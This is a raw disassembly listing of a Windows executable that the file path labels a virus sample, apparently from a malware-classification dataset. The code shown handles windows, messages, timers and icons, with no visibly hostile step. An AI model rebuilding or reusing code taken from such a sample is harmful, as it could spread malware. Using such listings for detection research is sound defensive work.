
malware_samples/virus/c829ccecac3a97fb551ef0dc2f22a9e0e72939574af0f13230c096bc39fe63d4.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	55                   	push   %ebp
  401001:	8b ec                	mov    %esp,%ebp
  401003:	83 ec 44             	sub    $0x44,%esp
  401006:	53                   	push   %ebx
  401007:	56                   	push   %esi
  401008:	57                   	push   %edi
  401009:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40100c:	68 a8 21 40 00       	push   $0x4021a8
  401011:	89 1d 44 20 40 00    	mov    %ebx,0x402044
  401017:	ff 75 10             	push   0x10(%ebp)
  40101a:	e8 f1 0d 00 00       	call   0x401e10
  40101f:	83 c4 08             	add    $0x8,%esp
  401022:	85 c0                	test   %eax,%eax
  401024:	0f 84 74 01 00 00    	je     0x40119e
  40102a:	50                   	push   %eax
  40102b:	e8 e6 0d 00 00       	call   0x401e16
  401030:	83 c4 04             	add    $0x4,%esp
  401033:	a3 58 21 40 00       	mov    %eax,0x402158
  401038:	68 ac 21 40 00       	push   $0x4021ac
  40103d:	6a 00                	push   $0x0
  40103f:	e8 cc 0d 00 00       	call   0x401e10
  401044:	83 c4 08             	add    $0x8,%esp
  401047:	85 c0                	test   %eax,%eax
  401049:	0f 84 43 01 00 00    	je     0x401192
  40104f:	50                   	push   %eax
  401050:	e8 c1 0d 00 00       	call   0x401e16
  401055:	83 c4 04             	add    $0x4,%esp
  401058:	a3 64 21 40 00       	mov    %eax,0x402164
  40105d:	68 b0 21 40 00       	push   $0x4021b0
  401062:	6a 00                	push   $0x0
  401064:	e8 a7 0d 00 00       	call   0x401e10
  401069:	83 c4 08             	add    $0x8,%esp
  40106c:	8b f8                	mov    %eax,%edi
  40106e:	85 ff                	test   %edi,%edi
  401070:	0f 84 0e 01 00 00    	je     0x401184
  401076:	b9 ff ff ff ff       	mov    $0xffffffff,%ecx
  40107b:	2b c0                	sub    %eax,%eax
  40107d:	f2 ae                	repnz scas %es:(%edi),%al
  40107f:	f7 d1                	not    %ecx
  401081:	2b f9                	sub    %ecx,%edi
  401083:	8b c1                	mov    %ecx,%eax
  401085:	c1 e9 02             	shr    $0x2,%ecx
  401088:	8b f7                	mov    %edi,%esi
  40108a:	bf 4c 20 40 00       	mov    $0x40204c,%edi
  40108f:	f3 a5                	rep movsl %ds:(%esi),%es:(%edi)
  401091:	8b c8                	mov    %eax,%ecx
  401093:	83 e1 03             	and    $0x3,%ecx
  401096:	f3 a4                	rep movsb %ds:(%esi),%es:(%edi)
  401098:	c7 45 bc 00 40 00 00 	movl   $0x4000,-0x44(%ebp)
  40109f:	6a 64                	push   $0x64
  4010a1:	89 5d cc             	mov    %ebx,-0x34(%ebp)
  4010a4:	c7 45 c0 1a 13 40 00 	movl   $0x40131a,-0x40(%ebp)
  4010ab:	c7 45 c4 00 00 00 00 	movl   $0x0,-0x3c(%ebp)
  4010b2:	c7 45 c8 1e 00 00 00 	movl   $0x1e,-0x38(%ebp)
  4010b9:	53                   	push   %ebx
  4010ba:	ff 15 dc 31 40 00    	call   *0x4031dc
  4010c0:	68 00 7f 00 00       	push   $0x7f00
  4010c5:	89 45 d0             	mov    %eax,-0x30(%ebp)
  4010c8:	6a 00                	push   $0x0
  4010ca:	ff 15 d8 31 40 00    	call   *0x4031d8
  4010d0:	c7 45 d8 10 00 00 00 	movl   $0x10,-0x28(%ebp)
  4010d7:	c7 45 dc 00 00 00 00 	movl   $0x0,-0x24(%ebp)
  4010de:	c7 45 e0 b4 21 40 00 	movl   $0x4021b4,-0x20(%ebp)
  4010e5:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4010e8:	8d 45 bc             	lea    -0x44(%ebp),%eax
  4010eb:	50                   	push   %eax
  4010ec:	ff 15 d4 31 40 00    	call   *0x4031d4
  4010f2:	66 85 c0             	test   %ax,%ax
  4010f5:	74 7f                	je     0x401176
  4010f7:	6a 00                	push   $0x0
  4010f9:	6a 00                	push   $0x0
  4010fb:	6a 00                	push   $0x0
  4010fd:	68 e8 03 00 00       	push   $0x3e8
  401102:	53                   	push   %ebx
  401103:	ff 15 d0 31 40 00    	call   *0x4031d0
  401109:	a3 00 20 40 00       	mov    %eax,0x402000
  40110e:	85 c0                	test   %eax,%eax
  401110:	74 64                	je     0x401176
  401112:	6a 00                	push   $0x0
  401114:	6a 00                	push   $0x0
  401116:	68 64 04 00 00       	push   $0x464
  40111b:	50                   	push   %eax
  40111c:	ff 15 cc 31 40 00    	call   *0x4031cc
  401122:	6a 00                	push   $0x0
  401124:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  401127:	6a 00                	push   $0x0
  401129:	8b 35 c8 31 40 00    	mov    0x4031c8,%esi
  40112f:	6a 00                	push   $0x0
  401131:	51                   	push   %ecx
  401132:	ff d6                	call   *%esi
  401134:	85 c0                	test   %eax,%eax
  401136:	74 66                	je     0x40119e
  401138:	8b 3d e0 31 40 00    	mov    0x4031e0,%edi
  40113e:	8b 1d e8 31 40 00    	mov    0x4031e8,%ebx
  401144:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401147:	50                   	push   %eax
  401148:	ff 35 00 20 40 00    	push   0x402000
  40114e:	ff d7                	call   *%edi
  401150:	85 c0                	test   %eax,%eax
  401152:	75 10                	jne    0x401164
  401154:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401157:	50                   	push   %eax
  401158:	ff d3                	call   *%ebx
  40115a:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40115d:	50                   	push   %eax
  40115e:	ff 15 e4 31 40 00    	call   *0x4031e4
  401164:	6a 00                	push   $0x0
  401166:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  401169:	6a 00                	push   $0x0
  40116b:	6a 00                	push   $0x0
  40116d:	50                   	push   %eax
  40116e:	ff d6                	call   *%esi
  401170:	85 c0                	test   %eax,%eax
  401172:	75 d0                	jne    0x401144
  401174:	eb 28                	jmp    0x40119e
  401176:	a1 58 21 40 00       	mov    0x402158,%eax
  40117b:	50                   	push   %eax
  40117c:	ff 15 b8 31 40 00    	call   *0x4031b8
  401182:	eb 1a                	jmp    0x40119e
  401184:	a1 58 21 40 00       	mov    0x402158,%eax
  401189:	50                   	push   %eax
  40118a:	ff 15 b8 31 40 00    	call   *0x4031b8
  401190:	eb 0c                	jmp    0x40119e
  401192:	a1 58 21 40 00       	mov    0x402158,%eax
  401197:	50                   	push   %eax
  401198:	ff 15 b8 31 40 00    	call   *0x4031b8
  40119e:	33 c0                	xor    %eax,%eax
  4011a0:	5f                   	pop    %edi
  4011a1:	5e                   	pop    %esi
  4011a2:	5b                   	pop    %ebx
  4011a3:	8b e5                	mov    %ebp,%esp
  4011a5:	5d                   	pop    %ebp
  4011a6:	c2 10 00             	ret    $0x10
  4011a9:	55                   	push   %ebp
  4011aa:	8b ec                	mov    %esp,%ebp
  4011ac:	81 ec 20 01 00 00    	sub    $0x120,%esp
  4011b2:	53                   	push   %ebx
  4011b3:	56                   	push   %esi
  4011b4:	57                   	push   %edi
  4011b5:	8b 75 08             	mov    0x8(%ebp),%esi
  4011b8:	68 e9 03 00 00       	push   $0x3e9
  4011bd:	56                   	push   %esi
  4011be:	ff 15 ec 31 40 00    	call   *0x4031ec
  4011c4:	8b f8                	mov    %eax,%edi
  4011c6:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4011c9:	50                   	push   %eax
  4011ca:	57                   	push   %edi
  4011cb:	ff 15 f0 31 40 00    	call   *0x4031f0
  4011d1:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  4011d4:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4011d7:	8d 84 01 fc fe ff ff 	lea    -0x104(%ecx,%eax,1),%eax
  4011de:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4011e1:	99                   	cltd
  4011e2:	2b c2                	sub    %edx,%eax
  4011e4:	8b 55 ec             	mov    -0x14(%ebp),%edx
  4011e7:	d1 f8                	sar    $1,%eax
  4011e9:	89 45 f8             	mov    %eax,-0x8(%ebp)
  4011ec:	8d 44 0a 9f          	lea    -0x61(%edx,%ecx,1),%eax
  4011f0:	99                   	cltd
  4011f1:	2b c2                	sub    %edx,%eax
  4011f3:	d1 f8                	sar    $1,%eax
  4011f5:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4011f8:	8d 45 f8             	lea    -0x8(%ebp),%eax
  4011fb:	50                   	push   %eax
  4011fc:	56                   	push   %esi
  4011fd:	ff 15 f4 31 40 00    	call   *0x4031f4
  401203:	6a 01                	push   $0x1
  401205:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401208:	6a 00                	push   $0x0
  40120a:	83 c0 33             	add    $0x33,%eax
  40120d:	6a 00                	push   $0x0
  40120f:	50                   	push   %eax
  401210:	8b 45 f8             	mov    -0x8(%ebp),%eax
  401213:	05 82 00 00 00       	add    $0x82,%eax
  401218:	50                   	push   %eax
  401219:	57                   	push   %edi
  40121a:	68 eb 03 00 00       	push   $0x3eb
  40121f:	56                   	push   %esi
  401220:	ff 15 ec 31 40 00    	call   *0x4031ec
  401226:	50                   	push   %eax
  401227:	ff 15 40 32 40 00    	call   *0x403240
  40122d:	6a 01                	push   $0x1
  40122f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401232:	6a 00                	push   $0x0
  401234:	83 c0 3b             	add    $0x3b,%eax
  401237:	6a 00                	push   $0x0
  401239:	50                   	push   %eax
  40123a:	8b 45 f8             	mov    -0x8(%ebp),%eax
  40123d:	05 92 00 00 00       	add    $0x92,%eax
  401242:	50                   	push   %eax
  401243:	57                   	push   %edi
  401244:	68 ec 03 00 00       	push   $0x3ec
  401249:	56                   	push   %esi
  40124a:	ff 15 ec 31 40 00    	call   *0x4031ec
  401250:	50                   	push   %eax
  401251:	ff 15 40 32 40 00    	call   *0x403240
  401257:	68 ee 03 00 00       	push   $0x3ee
  40125c:	56                   	push   %esi
  40125d:	ff 15 ec 31 40 00    	call   *0x4031ec
  401263:	8b d8                	mov    %eax,%ebx
  401265:	8b 45 e8             	mov    -0x18(%ebp),%eax
  401268:	2b 45 f0             	sub    -0x10(%ebp),%eax
  40126b:	8d 4d e8             	lea    -0x18(%ebp),%ecx
  40126e:	05 04 01 00 00       	add    $0x104,%eax
  401273:	51                   	push   %ecx
  401274:	99                   	cltd
  401275:	2b c2                	sub    %edx,%eax
  401277:	53                   	push   %ebx
  401278:	d1 f8                	sar    $1,%eax
  40127a:	01 45 f8             	add    %eax,-0x8(%ebp)
  40127d:	ff 15 f0 31 40 00    	call   *0x4031f0
  401283:	6a 01                	push   $0x1
  401285:	8b 45 fc             	mov    -0x4(%ebp),%eax
  401288:	6a 00                	push   $0x0
  40128a:	2b 45 f4             	sub    -0xc(%ebp),%eax
  40128d:	6a 00                	push   $0x0
  40128f:	03 45 ec             	add    -0x14(%ebp),%eax
  401292:	83 c0 4f             	add    $0x4f,%eax
  401295:	50                   	push   %eax
  401296:	ff 75 f8             	push   -0x8(%ebp)
  401299:	57                   	push   %edi
  40129a:	53                   	push   %ebx
  40129b:	ff 15 40 32 40 00    	call   *0x403240
  4012a1:	68 05 01 00 00       	push   $0x105
  4012a6:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4012ac:	50                   	push   %eax
  4012ad:	53                   	push   %ebx
  4012ae:	ff 15 04 32 40 00    	call   *0x403204
  4012b4:	8d 8d e0 fe ff ff    	lea    -0x120(%ebp),%ecx
  4012ba:	51                   	push   %ecx
  4012bb:	68 ee 03 00 00       	push   $0x3ee
  4012c0:	56                   	push   %esi
  4012c1:	e8 90 05 00 00       	call   0x401856
  4012c6:	68 ed 03 00 00       	push   $0x3ed
  4012cb:	56                   	push   %esi
  4012cc:	ff 15 ec 31 40 00    	call   *0x4031ec
  4012d2:	8b d8                	mov    %eax,%ebx
  4012d4:	6a 01                	push   $0x1
  4012d6:	6a 00                	push   $0x0
  4012d8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4012db:	6a 00                	push   $0x0
  4012dd:	83 c0 53             	add    $0x53,%eax
  4012e0:	50                   	push   %eax
  4012e1:	ff 75 f8             	push   -0x8(%ebp)
  4012e4:	57                   	push   %edi
  4012e5:	53                   	push   %ebx
  4012e6:	ff 15 40 32 40 00    	call   *0x403240
  4012ec:	68 05 01 00 00       	push   $0x105
  4012f1:	8d 85 e0 fe ff ff    	lea    -0x120(%ebp),%eax
  4012f7:	50                   	push   %eax
  4012f8:	53                   	push   %ebx
  4012f9:	ff 15 04 32 40 00    	call   *0x403204
  4012ff:	8d 8d e0 fe ff ff    	lea    -0x120(%ebp),%ecx
  401305:	51                   	push   %ecx
  401306:	68 ed 03 00 00       	push   $0x3ed
  40130b:	56                   	push   %esi
  40130c:	e8 45 05 00 00       	call   0x401856
  401311:	5f                   	pop    %edi
  401312:	5e                   	pop    %esi
  401313:	5b                   	pop    %ebx
  401314:	8b e5                	mov    %ebp,%esp
  401316:	5d                   	pop    %ebp
  401317:	c2 04 00             	ret    $0x4
  40131a:	55                   	push   %ebp
  40131b:	8b 4c 24 0c          	mov    0xc(%esp),%ecx
  40131f:	8b ec                	mov    %esp,%ebp
  401321:	83 f9 10             	cmp    $0x10,%ecx
  401324:	56                   	push   %esi
  401325:	77 0d                	ja     0x401334
  401327:	0f 84 99 00 00 00    	je     0x4013c6
  40132d:	83 f9 02             	cmp    $0x2,%ecx
  401330:	74 62                	je     0x401394
  401332:	eb 4b                	jmp    0x40137f
  401334:	83 f9 15             	cmp    $0x15,%ecx
  401337:	0f 84 9d 00 00 00    	je     0x4013da
  40133d:	83 f9 53             	cmp    $0x53,%ecx
  401340:	0f 84 a1 00 00 00    	je     0x4013e7
  401346:	83 f9 7b             	cmp    $0x7b,%ecx
  401349:	0f 84 98 00 00 00    	je     0x4013e7
  40134f:	81 f9 11 01 00 00    	cmp    $0x111,%ecx
  401355:	0f 84 a2 00 00 00    	je     0x4013fd
  40135b:	81 f9 13 01 00 00    	cmp    $0x113,%ecx
  401361:	0f 84 b7 00 00 00    	je     0x40141e
  401367:	81 f9 64 04 00 00    	cmp    $0x464,%ecx
  40136d:	0f 84 d2 00 00 00    	je     0x401445
  401373:	81 f9 65 04 00 00    	cmp    $0x465,%ecx
  401379:	0f 84 5b 01 00 00    	je     0x4014da
  40137f:	ff 75 14             	push   0x14(%ebp)
  401382:	ff 75 10             	push   0x10(%ebp)
  401385:	51                   	push   %ecx
  401386:	ff 75 08             	push   0x8(%ebp)
  401389:	ff 15 18 32 40 00    	call   *0x403218
  40138f:	e9 8a 01 00 00       	jmp    0x40151e
  401394:	a1 58 21 40 00       	mov    0x402158,%eax
  401399:	85 c0                	test   %eax,%eax
  40139b:	74 07                	je     0x4013a4
  40139d:	50                   	push   %eax
  40139e:	ff 15 b8 31 40 00    	call   *0x4031b8
  4013a4:	a1 8c 21 40 00       	mov    0x40218c,%eax
  4013a9:	85 c0                	test   %eax,%eax
  4013ab:	74 07                	je     0x4013b4
  4013ad:	50                   	push   %eax
  4013ae:	ff 15 14 32 40 00    	call   *0x403214
  4013b4:	e8 f9 01 00 00       	call   0x4015b2
  4013b9:	6a 00                	push   $0x0
  4013bb:	ff 15 10 32 40 00    	call   *0x403210
  4013c1:	e9 56 01 00 00       	jmp    0x40151c
  4013c6:	c7 05 48 20 40 00 01 	movl   $0x1,0x402048
  4013cd:	00 00 00 
  4013d0:	6a 00                	push   $0x0
  4013d2:	ff 75 08             	push   0x8(%ebp)
  4013d5:	e9 3c 01 00 00       	jmp    0x401516
  4013da:	ff 75 08             	push   0x8(%ebp)
  4013dd:	e8 13 02 00 00       	call   0x4015f5
  4013e2:	e9 35 01 00 00       	jmp    0x40151c
  4013e7:	ff 75 14             	push   0x14(%ebp)
  4013ea:	ff 75 10             	push   0x10(%ebp)
  4013ed:	51                   	push   %ecx
  4013ee:	68 dc 21 40 00       	push   $0x4021dc
  4013f3:	e8 57 08 00 00       	call   0x401c4f
  4013f8:	e9 1f 01 00 00       	jmp    0x40151c
  4013fd:	0f b7 45 10          	movzwl 0x10(%ebp),%eax
  401401:	83 f8 01             	cmp    $0x1,%eax
  401404:	0f 85 12 01 00 00    	jne    0x40151c
  40140a:	c7 05 48 20 40 00 01 	movl   $0x1,0x402048
  401411:	00 00 00 
  401414:	6a 00                	push   $0x0
  401416:	ff 75 08             	push   0x8(%ebp)
  401419:	e9 f8 00 00 00       	jmp    0x401516
  40141e:	6a 00                	push   $0x0
  401420:	8b 75 08             	mov    0x8(%ebp),%esi
  401423:	6a 01                	push   $0x1
  401425:	56                   	push   %esi
  401426:	e8 51 02 00 00       	call   0x40167c
  40142b:	85 c0                	test   %eax,%eax
  40142d:	0f 84 e9 00 00 00    	je     0x40151c
  401433:	56                   	push   %esi
  401434:	e8 db 07 00 00       	call   0x401c14
  401439:	56                   	push   %esi
  40143a:	ff 15 00 32 40 00    	call   *0x403200
  401440:	e9 d7 00 00 00       	jmp    0x40151c
  401445:	6a 40                	push   $0x40
  401447:	a1 44 20 40 00       	mov    0x402044,%eax
  40144c:	c7 05 48 20 40 00 01 	movl   $0x1,0x402048
  401453:	00 00 00 
  401456:	68 04 20 40 00       	push   $0x402004
  40145b:	68 b1 04 00 00       	push   $0x4b1
  401460:	50                   	push   %eax
  401461:	ff 15 0c 32 40 00    	call   *0x40320c
  401467:	85 c0                	test   %eax,%eax
  401469:	75 10                	jne    0x40147b
  40146b:	68 c8 21 40 00       	push   $0x4021c8
  401470:	68 04 20 40 00       	push   $0x402004
  401475:	ff 15 b0 31 40 00    	call   *0x4031b0
  40147b:	e8 a3 00 00 00       	call   0x401523
  401480:	6a 00                	push   $0x0
  401482:	8b 75 08             	mov    0x8(%ebp),%esi
  401485:	6a 00                	push   $0x0
  401487:	56                   	push   %esi
  401488:	e8 ef 01 00 00       	call   0x40167c
  40148d:	85 c0                	test   %eax,%eax
  40148f:	74 1a                	je     0x4014ab
  401491:	a1 58 21 40 00       	mov    0x402158,%eax
  401496:	50                   	push   %eax
  401497:	ff 15 b8 31 40 00    	call   *0x4031b8
  40149d:	e8 10 01 00 00       	call   0x4015b2
  4014a2:	56                   	push   %esi
  4014a3:	ff 15 00 32 40 00    	call   *0x403200
  4014a9:	eb 71                	jmp    0x40151c
  4014ab:	68 4c 20 40 00       	push   $0x40204c
  4014b0:	56                   	push   %esi
  4014b1:	ff 15 08 32 40 00    	call   *0x403208
  4014b7:	6a 00                	push   $0x0
  4014b9:	68 fa 00 00 00       	push   $0xfa
  4014be:	6a 01                	push   $0x1
  4014c0:	56                   	push   %esi
  4014c1:	ff 15 44 32 40 00    	call   *0x403244
  4014c7:	56                   	push   %esi
  4014c8:	a3 60 21 40 00       	mov    %eax,0x402160
  4014cd:	e8 23 01 00 00       	call   0x4015f5
  4014d2:	56                   	push   %esi
  4014d3:	e8 d1 fc ff ff       	call   0x4011a9
  4014d8:	eb 42                	jmp    0x40151c
  4014da:	81 7d 14 03 02 00 00 	cmpl   $0x203,0x14(%ebp)
  4014e1:	75 39                	jne    0x40151c
  4014e3:	6a 01                	push   $0x1
  4014e5:	8b 75 08             	mov    0x8(%ebp),%esi
  4014e8:	c7 05 48 20 40 00 00 	movl   $0x0,0x402048
  4014ef:	00 00 00 
  4014f2:	6a 01                	push   $0x1
  4014f4:	56                   	push   %esi
  4014f5:	e8 82 01 00 00       	call   0x40167c
  4014fa:	56                   	push   %esi
  4014fb:	85 c0                	test   %eax,%eax
  4014fd:	74 0e                	je     0x40150d
  4014ff:	e8 10 07 00 00       	call   0x401c14
  401504:	56                   	push   %esi
  401505:	ff 15 00 32 40 00    	call   *0x403200
  40150b:	eb 0f                	jmp    0x40151c
  40150d:	ff 15 fc 31 40 00    	call   *0x4031fc
  401513:	6a 01                	push   $0x1
  401515:	56                   	push   %esi
  401516:	ff 15 f8 31 40 00    	call   *0x4031f8
  40151c:	33 c0                	xor    %eax,%eax
  40151e:	5e                   	pop    %esi
  40151f:	5d                   	pop    %ebp
  401520:	c2 10 00             	ret    $0x10
  401523:	56                   	push   %esi
  401524:	a1 44 20 40 00       	mov    0x402044,%eax
  401529:	6a 00                	push   $0x0
  40152b:	8b 35 20 32 40 00    	mov    0x403220,%esi
  401531:	6a 10                	push   $0x10
  401533:	6a 10                	push   $0x10
  401535:	6a 01                	push   $0x1
  401537:	6a 64                	push   $0x64
  401539:	50                   	push   %eax
  40153a:	ff d6                	call   *%esi
  40153c:	6a 00                	push   $0x0
  40153e:	a3 6c 21 40 00       	mov    %eax,0x40216c
  401543:	6a 10                	push   $0x10
  401545:	6a 10                	push   $0x10
  401547:	6a 01                	push   $0x1
  401549:	6a 65                	push   $0x65
  40154b:	ff 35 44 20 40 00    	push   0x402044
  401551:	ff d6                	call   *%esi
  401553:	6a 00                	push   $0x0
  401555:	a3 70 21 40 00       	mov    %eax,0x402170
  40155a:	6a 10                	push   $0x10
  40155c:	a1 44 20 40 00       	mov    0x402044,%eax
  401561:	6a 10                	push   $0x10
  401563:	6a 01                	push   $0x1
  401565:	6a 66                	push   $0x66
  401567:	50                   	push   %eax
  401568:	ff d6                	call   *%esi
  40156a:	6a 00                	push   $0x0
  40156c:	a3 74 21 40 00       	mov    %eax,0x402174
  401571:	6a 10                	push   $0x10
  401573:	a1 44 20 40 00       	mov    0x402044,%eax
  401578:	6a 10                	push   $0x10
  40157a:	6a 01                	push   $0x1
  40157c:	6a 67                	push   $0x67
  40157e:	50                   	push   %eax
  40157f:	ff d6                	call   *%esi
  401581:	68 4d 04 00 00       	push   $0x44d
  401586:	8b 35 1c 32 40 00    	mov    0x40321c,%esi
  40158c:	a3 78 21 40 00       	mov    %eax,0x402178
  401591:	a1 44 20 40 00       	mov    0x402044,%eax
  401596:	50                   	push   %eax
  401597:	ff d6                	call   *%esi
  401599:	68 4e 04 00 00       	push   $0x44e
  40159e:	a3 50 21 40 00       	mov    %eax,0x402150
  4015a3:	ff 35 44 20 40 00    	push   0x402044
  4015a9:	ff d6                	call   *%esi
  4015ab:	5e                   	pop    %esi
  4015ac:	a3 54 21 40 00       	mov    %eax,0x402154
  4015b1:	c3                   	ret
  4015b2:	56                   	push   %esi
  4015b3:	57                   	push   %edi
  4015b4:	bf 6c 21 40 00       	mov    $0x40216c,%edi
  4015b9:	8b 35 14 32 40 00    	mov    0x403214,%esi
  4015bf:	8b 07                	mov    (%edi),%eax
  4015c1:	85 c0                	test   %eax,%eax
  4015c3:	74 03                	je     0x4015c8
  4015c5:	50                   	push   %eax
  4015c6:	ff d6                	call   *%esi
  4015c8:	83 c7 04             	add    $0x4,%edi
  4015cb:	81 ff 7c 21 40 00    	cmp    $0x40217c,%edi
  4015d1:	72 ec                	jb     0x4015bf
  4015d3:	bf 50 21 40 00       	mov    $0x402150,%edi
  4015d8:	8b 35 88 31 40 00    	mov    0x403188,%esi
  4015de:	8b 07                	mov    (%edi),%eax
  4015e0:	85 c0                	test   %eax,%eax
  4015e2:	74 03                	je     0x4015e7
  4015e4:	50                   	push   %eax
  4015e5:	ff d6                	call   *%esi
  4015e7:	83 c7 04             	add    $0x4,%edi
  4015ea:	81 ff 58 21 40 00    	cmp    $0x402158,%edi
  4015f0:	72 ec                	jb     0x4015de
  4015f2:	5f                   	pop    %edi
  4015f3:	5e                   	pop    %esi
  4015f4:	c3                   	ret
  4015f5:	56                   	push   %esi
  4015f6:	a1 8c 21 40 00       	mov    0x40218c,%eax
  4015fb:	57                   	push   %edi
  4015fc:	85 c0                	test   %eax,%eax
  4015fe:	74 07                	je     0x401607
  401600:	50                   	push   %eax
  401601:	ff 15 14 32 40 00    	call   *0x403214
  401607:	6a 00                	push   $0x0
  401609:	a1 44 20 40 00       	mov    0x402044,%eax
  40160e:	6a 00                	push   $0x0
  401610:	6a 00                	push   $0x0
  401612:	6a 01                	push   $0x1
  401614:	6a 63                	push   $0x63
  401616:	50                   	push   %eax
  401617:	ff 15 20 32 40 00    	call   *0x403220
  40161d:	a3 8c 21 40 00       	mov    %eax,0x40218c
  401622:	85 c0                	test   %eax,%eax
  401624:	74 51                	je     0x401677
  401626:	8b 74 24 0c          	mov    0xc(%esp),%esi
  40162a:	50                   	push   %eax
  40162b:	6a 01                	push   $0x1
  40162d:	8b 3d 24 32 40 00    	mov    0x403224,%edi
  401633:	68 72 01 00 00       	push   $0x172
  401638:	68 e9 03 00 00       	push   $0x3e9
  40163d:	56                   	push   %esi
  40163e:	ff d7                	call   *%edi
  401640:	a1 84 21 40 00       	mov    0x402184,%eax
  401645:	ff 34 85 50 21 40 00 	push   0x402150(,%eax,4)
  40164c:	6a 00                	push   $0x0
  40164e:	68 72 01 00 00       	push   $0x172
  401653:	68 ec 03 00 00       	push   $0x3ec
  401658:	56                   	push   %esi
  401659:	ff d7                	call   *%edi
  40165b:	8b 0d 88 21 40 00    	mov    0x402188,%ecx
  401661:	ff 34 8d 50 21 40 00 	push   0x402150(,%ecx,4)
  401668:	6a 00                	push   $0x0
  40166a:	68 72 01 00 00       	push   $0x172
  40166f:	68 eb 03 00 00       	push   $0x3eb
  401674:	56                   	push   %esi
  401675:	ff d7                	call   *%edi
  401677:	5f                   	pop    %edi
  401678:	5e                   	pop    %esi
  401679:	c2 04 00             	ret    $0x4
  40167c:	55                   	push   %ebp
  40167d:	8b ec                	mov    %esp,%ebp
  40167f:	83 ec 18             	sub    $0x18,%esp
  401682:	53                   	push   %ebx
  401683:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401686:	56                   	push   %esi
  401687:	57                   	push   %edi
  401688:	50                   	push   %eax
  401689:	e8 bb 00 00 00       	call   0x401749
  40168e:	8b f0                	mov    %eax,%esi
  401690:	85 f6                	test   %esi,%esi
  401692:	75 38                	jne    0x4016cc
  401694:	8d 45 e8             	lea    -0x18(%ebp),%eax
  401697:	8b 7d 08             	mov    0x8(%ebp),%edi
  40169a:	50                   	push   %eax
  40169b:	ff 75 0c             	push   0xc(%ebp)
  40169e:	57                   	push   %edi
  40169f:	e8 75 01 00 00       	call   0x401819
  4016a4:	83 3d 48 20 40 00 01 	cmpl   $0x1,0x402048
  4016ab:	1b c0                	sbb    %eax,%eax
  4016ad:	8b 5d 10             	mov    0x10(%ebp),%ebx
  4016b0:	f7 d8                	neg    %eax
  4016b2:	0b c3                	or     %ebx,%eax
  4016b4:	74 0b                	je     0x4016c1
  4016b6:	53                   	push   %ebx
  4016b7:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4016ba:	50                   	push   %eax
  4016bb:	57                   	push   %edi
  4016bc:	e8 75 02 00 00       	call   0x401936
  4016c1:	53                   	push   %ebx
  4016c2:	8d 45 e8             	lea    -0x18(%ebp),%eax
  4016c5:	50                   	push   %eax
  4016c6:	57                   	push   %edi
  4016c7:	e8 6b 03 00 00       	call   0x401a37
  4016cc:	8b c6                	mov    %esi,%eax
  4016ce:	5f                   	pop    %edi
  4016cf:	5e                   	pop    %esi
  4016d0:	5b                   	pop    %ebx
  4016d1:	8b e5                	mov    %ebp,%esp
  4016d3:	5d                   	pop    %ebp
  4016d4:	c2 0c 00             	ret    $0xc
  4016d7:	55                   	push   %ebp
  4016d8:	8b 44 24 08          	mov    0x8(%esp),%eax
  4016dc:	8b ec                	mov    %esp,%ebp
  4016de:	83 ec 58             	sub    $0x58,%esp
  4016e1:	c7 45 a8 58 00 00 00 	movl   $0x58,-0x58(%ebp)
  4016e8:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4016eb:	89 45 ac             	mov    %eax,-0x54(%ebp)
  4016ee:	8b 45 14             	mov    0x14(%ebp),%eax
  4016f1:	89 4d bc             	mov    %ecx,-0x44(%ebp)
  4016f4:	c7 45 b0 00 00 00 00 	movl   $0x0,-0x50(%ebp)
  4016fb:	c7 45 b4 07 00 00 00 	movl   $0x7,-0x4c(%ebp)
  401702:	c7 45 b8 65 04 00 00 	movl   $0x465,-0x48(%ebp)
  401709:	85 c0                	test   %eax,%eax
  40170b:	74 1a                	je     0x401727
  40170d:	ff 70 14             	push   0x14(%eax)
  401710:	ff 70 10             	push   0x10(%eax)
  401713:	68 04 20 40 00       	push   $0x402004
  401718:	8d 55 c0             	lea    -0x40(%ebp),%edx
  40171b:	52                   	push   %edx
  40171c:	ff 15 28 32 40 00    	call   *0x403228
  401722:	83 c4 10             	add    $0x10,%esp
  401725:	eb 0f                	jmp    0x401736
  401727:	68 cc 21 40 00       	push   $0x4021cc
  40172c:	8d 45 c0             	lea    -0x40(%ebp),%eax
  40172f:	50                   	push   %eax
  401730:	ff 15 b0 31 40 00    	call   *0x4031b0
  401736:	8d 45 a8             	lea    -0x58(%ebp),%eax
  401739:	50                   	push   %eax
  40173a:	ff 75 0c             	push   0xc(%ebp)
  40173d:	ff 15 c0 31 40 00    	call   *0x4031c0
  401743:	8b e5                	mov    %ebp,%esp
  401745:	5d                   	pop    %ebp
  401746:	c2 10 00             	ret    $0x10
  401749:	55                   	push   %ebp
  40174a:	8b ec                	mov    %esp,%ebp
  40174c:	83 ec 18             	sub    $0x18,%esp
  40174f:	56                   	push   %esi
  401750:	8b 75 08             	mov    0x8(%ebp),%esi
  401753:	c7 46 0c 00 00 00 00 	movl   $0x0,0xc(%esi)
  40175a:	c7 46 04 00 00 00 00 	movl   $0x0,0x4(%esi)
  401761:	6a 00                	push   $0x0
  401763:	c7 06 00 00 00 00    	movl   $0x0,(%esi)
  401769:	c7 46 08 00 00 00 00 	movl   $0x0,0x8(%esi)
  401770:	c7 46 10 00 00 00 00 	movl   $0x0,0x10(%esi)
  401777:	c7 46 14 00 00 00 00 	movl   $0x0,0x14(%esi)
  40177e:	a1 58 21 40 00       	mov    0x402158,%eax
  401783:	50                   	push   %eax
  401784:	ff 15 b4 31 40 00    	call   *0x4031b4
  40178a:	3d 02 01 00 00       	cmp    $0x102,%eax
